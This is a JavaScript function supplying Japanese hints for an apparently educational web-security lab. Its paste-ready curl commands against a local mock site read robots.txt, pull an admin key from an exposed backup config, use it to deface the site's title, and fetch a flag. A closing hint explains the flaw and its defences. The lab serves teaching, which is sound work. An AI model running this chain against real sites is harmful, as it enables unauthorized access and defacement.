export function mockHints() {
  const base='http://mocksite:3200/vulnerable';
  const curl='curl -sS --max-time 10 -H "X-TerminalBox-Session: $TERMINALBOX_SESSION_ID"';
  return [
    {theme:'discover',title:'1. 公開ファイルの手がかりを見る',steps:[{text:'そのまま貼り付けてEnterを押します。Disallowに出るバックアップの場所を確認してください。',command:`${curl} ${base}/robots.txt; printf '\\n'`}]},
    {theme:'backup',title:'2. 管理APIと管理キーを取得する',steps:[{text:'そのまま実行してください。adminApiとadminKeyが表示されます。取得内容はファイルへ保存するので、キーの書き写しは不要です。',command:`${curl} ${base}/backup/config.json | tee "/tmp/terminalbox-mock-$TERMINALBOX_SESSION_ID.json"; printf '\\n'`}]},
    {theme:'deface',title:'3. 管理APIで模擬サイトの表示を変更する',steps:[{text:'そのまま実行してください。手順2で保存したキーを自動で読み取ります。updated:true が出たら成功です。模擬サイトの「再読み込み」を押すとタイトルの変更を確認できます。',command:`KEY=$(python3 -c 'import json, os; print(json.load(open("/tmp/terminalbox-mock-"+os.environ["TERMINALBOX_SESSION_ID"]+".json"))["adminKey"])') && ${curl} -X POST --data-urlencode "adminKey=$KEY" --data-urlencode 'title=改ざんしました' ${base}/api/admin/banner; printf '\\n'`}]},
    {theme:'flag',title:'4. Flagを取得して回答する',steps:[{text:'TBX{…}が表示されます。その文字列を回答欄へ貼り付けて「回答」を押してください。',command:`${curl} ${base}/api/flag; printf '\\n'`}]},
    {theme:'understand',title:'ヒント：なぜ改ざんできたのか・どう防ぐか',steps:[{text:'成功した理由：公開バックアップに管理APIの場所と管理キーが含まれていました。取得したキーだけで管理APIが操作を許したため、第三者がタイトルを書き換えられました。robots.txtはファイルの存在を知らせるだけで、アクセスを禁止する仕組みではありません。'},{text:'対策：バックアップや設定ファイルをWeb公開領域に置かず、外部から取得できないようにします。漏れた管理キーは失効・再発行します。管理APIには利用者の認証と権限確認を設け、操作を記録します。Secure版ではバックアップ取得と、この演習用キーによる変更を拒否します。'},{text:'ここで公開されるキーと弱点は教材用に作ったものです。入力した実サイトに同じ弱点があることを意味しません。'}]},
  ];
}
